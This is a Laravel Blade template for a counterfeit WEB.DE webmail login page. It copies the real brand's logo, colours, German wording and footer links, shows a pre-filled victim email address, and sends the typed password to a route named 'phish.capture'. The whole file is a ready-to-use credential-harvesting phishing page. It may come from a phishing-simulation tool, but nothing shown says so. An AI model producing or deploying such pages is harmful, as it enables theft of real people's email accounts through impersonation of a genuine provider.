<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>WEB.DE Login</title>
    <link rel="icon" href="https://web.de/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Open Sans',-apple-system,sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column}
        .header{background:#fff;border-bottom:1px solid #d9d9d9;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
        .header-links{display:flex;gap:16px}
        .header-links a{font-size:13px;color:#0068b7;text-decoration:none;font-weight:600}
        .header-links a:hover{text-decoration:underline}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
        .login-box{background:#fff;border-radius:4px;padding:32px 40px;width:100%;max-width:420px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
        .logo-section{text-align:center;margin-bottom:24px}
        .logo-section .brand{font-size:32px;font-weight:900;color:#0068b7;letter-spacing:-1px}
        .logo-section .dot{color:#e8350f}
        .logo-section .tagline{font-size:13px;color:#8c8c8c;margin-top:4px}
        h2{font-size:18px;color:#333;text-align:center;margin-bottom:4px;font-weight:600}
        .sub{text-align:center;font-size:13px;color:#666;margin-bottom:24px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;border-radius:4px;margin-bottom:20px}
        .email-display .icon{width:32px;height:32px;border-radius:50%;background:#0068b7;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;margin-right:12px;flex-shrink:0}
        .email-display .text{font-size:14px;color:#333;font-weight:500}
        .form-group{margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;border:1px solid #ccc;border-radius:4px;outline:none;background:#fff;transition:border-color .2s}
        .form-group input:focus{border-color:#0068b7;box-shadow:0 0 0 2px rgba(0,104,183,.1)}
        .form-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
        .form-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
        .form-row label{font-size:13px;color:#666;cursor:pointer}
        .btn-login{width:100%;height:44px;background:#0068b7;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:700;cursor:pointer;transition:background .15s;font-family:'Open Sans',sans-serif}
        .btn-login:hover{background:#005594}
        .btn-login:active{background:#004477}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#0068b7;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{background:#333;color:#fff;padding:16px 24px;text-align:center;font-size:11px;margin-top:auto}
        .footer a{color:#ccc;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.login-box{padding:24px}}
    </style>
</head>
<body>
    <div class="header">
        <div style="font-size:24px;font-weight:900;color:#0068b7">WEB.DE</div>
        <div class="header-links">
            <a href="#">Hilfe</a>
            <a href="#">E-Mail</a>
        </div>
    </div>

    <div class="main">
        <div class="login-box">
            <div class="logo-section">
                <div class="brand">WEB<span class="dot">.</span>DE</div>
                <div class="tagline">FreeMail</div>
            </div>

            <h2>Willkommen bei WEB.DE</h2>
            <p class="sub">Bitte melden Sie sich mit Ihren Zugangsdaten an.</p>

            <div class="email-display">
                <div class="icon">{{ strtoupper(substr($email, 0, 1)) }}</div>
                <div class="text">{{ $email }}</div>
            </div>

            <form action="{{ route('phish.capture', ['provider' => 'webde', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="password">Passwort</label>
                    <input type="password" id="password" name="password" required autofocus>
                </div>

                <div class="form-row">
                    <input type="checkbox" id="keepLogin" checked>
                    <label for="keepLogin">Angemeldet bleiben</label>
                </div>

                <button type="submit" class="btn-login">Anmelden</button>
            </form>

            <div class="links-row">
                <a href="#">Passwort vergessen?</a>
                <a href="#">Noch kein Konto?</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Hilfe</a>
        <div style="margin-top:8px">© 2026 WEB.DE</div>
    </div>
</body>
</html>
